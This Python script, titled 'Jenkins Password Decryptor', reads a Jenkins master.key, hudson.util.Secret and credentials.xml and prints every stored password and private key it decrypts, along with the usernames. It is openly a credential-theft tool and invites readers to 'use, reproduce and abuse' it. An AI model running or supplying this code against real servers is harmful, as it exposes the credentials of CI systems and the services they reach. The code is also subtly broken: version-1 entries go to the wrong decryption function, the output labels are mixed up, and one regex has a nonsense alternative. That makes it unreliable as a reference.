#!/usr/bin/env python3
#
#   Author: Jose Maria Zaragoza.
#   January 2020 - Script Creation.
#   Version = 0.1
#   Feel free to use, reproduce and abuse.


import re
import sys
import base64
from hashlib import sha256
from binascii import hexlify, unhexlify
from Crypto.Cipher import AES

MAGIC = b"::::MAGIC::::"

def usage():
  print ("[!] Usage: python3 "+sys.argv[0]+" <master.key> <hudson.util.Secret> <credentials.xml>")
  sys.exit(0)

def decryptNewPassword(secret, p):
  p = p[1:] #Strip the version
  iv_length = ((p[0] & 0xff) << 24) | ((p[1] & 0xff) << 16) | ((p[2] & 0xff) << 8) | (p[3] & 0xff)
  p = p[4:]
  data_length = ((p[0] & 0xff) << 24) | ((p[1] & 0xff) << 16) | ((p[2] & 0xff) << 8) | (p[3] & 0xff)
  p = p[4:]
  iv = p[:iv_length]
  p = p[iv_length:]
  o = AES.new(secret, AES.MODE_CBC, iv)
  decrypted_p = o.decrypt(p)
  fully_decrypted_blocks = decrypted_p[:-16]
  possibly_padded_block = decrypted_p[-16:]
  padding_length = possibly_padded_block[-1]
  if padding_length <= 16: # Less than size of one block, so we have padding
    possibly_padded_block = possibly_padded_block[:-padding_length]

  pw = fully_decrypted_blocks + possibly_padded_block
  pw = pw.decode('utf-8')
  return pw

def decryptOldPassword(secret, p):
  o = AES.new(secret, AES.MODE_ECB)
  x = o.decrypt(p)
  assert MAGIC in x
  return re.findall(b'(.*)' + MAGIC, x)[0]


def banner():
  print('#####################################################################')
  print('###                        JENKINS DECRYPTOR                      ###')
  print('###                  Jenkins Password Decryptor 2020              ###')
  print('#####################################################################\n')

def main():
  if len(sys.argv) != 4:
    usage()

  master_key = open(sys.argv[1], 'rb').read()
  hudson_secret_key = open(sys.argv[2], 'rb').read()
  hashed_master_key = sha256(master_key).digest()[:16]
  o = AES.new(hashed_master_key, AES.MODE_ECB)
  secret = o.decrypt(hudson_secret_key)

  secret = secret[:-16]
  secret = secret[:16]

  credentials = open(sys.argv[3]).read()
  titles =  re.findall(r'<u(?:sername|rivateKey)>\{?(.*?)\}?</u(?:sername|rivateKey)>', credentials)
  t = 0
  passwords = re.findall(r'<p(?:assword|rivateKey)>\{?(.*?)\}?</p(?:assword|rivateKey)>', credentials)
  for password in passwords:

    p = base64.decodebytes(bytes(password, 'utf-8'))
   # print (password)
    payload_version = p[0]
    if payload_version == 1:
      print ("[+] New Password Detected : "+titles[t])
      t += 1
      print ("[+] Detected Hash: "+password)
      #print (decryptNewPassword(secret, p))
      print ("[+] Decrypted Password : "+str(decryptOldPassword(secret,p))+'\n')

    else:
      print ("[+] New Password Detected : "+titles[t])
      t += 1
      print ("[+] Detected New Hash : "+password)
      print ("[+] Decrypted Password : "+str(decryptOldPassword(secret,p))+'\n')
      #print (decryptOldPassword(secret,p))

if __name__ == '__main__':
  banner()
  main()
